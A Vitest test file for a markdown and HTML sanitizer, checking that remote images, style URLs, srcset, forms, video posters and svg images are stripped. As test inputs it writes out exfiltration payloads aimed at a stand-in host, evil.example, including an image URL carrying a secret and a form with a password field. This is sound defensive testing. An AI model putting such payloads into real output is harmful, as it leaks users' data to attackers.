// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderSafeMarkdown, sanitizeHtml } from './safeHtml';

describe('renderSafeMarkdown', () => {
  it('does not load remote images (zero-click exfiltration)', () => {
    const html = renderSafeMarkdown('Done! ![logo](https://evil.example/p?d=secret)');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('remote image not loaded: logo');
  });

  it('keeps data: images', () => {
    const html = renderSafeMarkdown('![chart](data:image/png;base64,AAAA)');
    expect(html).toContain('src="data:image/png;base64,AAAA"');
  });

  it('strips style attributes, srcset, forms and media', () => {
    const html = sanitizeHtml(
      '<p style="background:url(https://evil.example/x)">a</p>' +
        '<img src="data:image/png;base64,AA" srcset="https://evil.example/2x 2x">' +
        '<form action="https://evil.example"><input name="password"></form>' +
        '<video poster="https://evil.example/p.png"></video>' +
        '<svg><image href="https://evil.example/s.png"></image></svg>',
    );
    expect(html).not.toContain('evil.example');
    expect(html).not.toMatch(/<form|<input|<video|<svg/);
  });

  it('opens links in a new tab', () => {
    const html = renderSafeMarkdown('[docs](https://example.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});
